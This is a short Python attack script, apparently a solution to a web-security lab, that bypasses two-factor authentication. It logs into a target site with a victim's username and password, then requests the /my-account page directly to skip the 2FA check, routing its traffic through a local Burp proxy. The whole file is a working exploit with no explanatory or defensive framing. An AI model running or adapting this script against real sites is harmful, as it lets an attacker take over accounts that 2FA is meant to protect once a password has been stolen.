#!/usr/bin/env python3

import requests
import sys
import urllib3
import argparse
import time
import signal
import pdb
from termcolor import colored
from pwn import *

# Ctrl + c

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo...", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# HTTPS problem

urllib3.disable_warnings()

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def get_arguments():

    parser = argparse.ArgumentParser(description='2FA bypassing')
    parser.add_argument("-t", "--target", dest="target", required=True, help='Victim url (Ex: -u https://www.example.com)')
    parser.add_argument("-u", "--user", dest="user", required=True, help="User's victim")
    parser.add_argument("-p", "--password", dest="password", required=True, help="Password's victim")

    options = parser.parse_args()

    return options.target, options.user, options.password

def login_bypass(s, target, user, password):


    # Login user
    print(colored(f"[+] Login in account", "green"))
    p1 = log.progress("Logueandose...")
    url_login = target + "/login"
    post_data = {
        'username': '%s' % user,
        'password': '%s' % password
    }
    
    r = s.post(url_login, data=post_data, allow_redirects=False, verify=False, proxies=proxies) # allow_redirects -> like dropout in burpsuite

    p2 = log.progress("Login Successfully...")
#    pdb.set_trace()
    
    time.sleep(2)

    p3 = log.progress("Bypassing 2FA security...")

    # Confirm bypass

    myaccount_url = target + "/my-account"
    r = s.get(myaccount_url, verify=False, proxies=proxies)

    if "Log out" in r.text:

        print(colored(f"[+] Successfully bypassed 2FA verification.", "green"))

    else:

        print(f"[!] Algo salio mal...")
        sys.exit(1)


def main():

    s = requests.session()
    s.verify = False
    target, user, password = get_arguments()
    login_bypass(s, target, user, password)


if __name__ == '__main__':

    main()
